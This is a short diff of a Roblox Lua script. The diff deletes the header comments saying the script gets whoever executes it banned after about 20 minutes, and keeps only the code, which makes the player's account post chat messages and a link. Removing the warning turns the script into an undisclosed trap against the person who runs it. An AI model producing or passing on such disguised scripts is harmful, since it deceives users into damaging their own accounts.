@@ -1,6 +1,4 @@
---Roblos ban script
---This shit will ban you on roblox if you execute it (after 20 mins)
---Made by Invisible_#3657
+
 game.Players:Chat("r u")
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("r u","All")
 game.Players:Chat("/e https://roblox.com/games/")
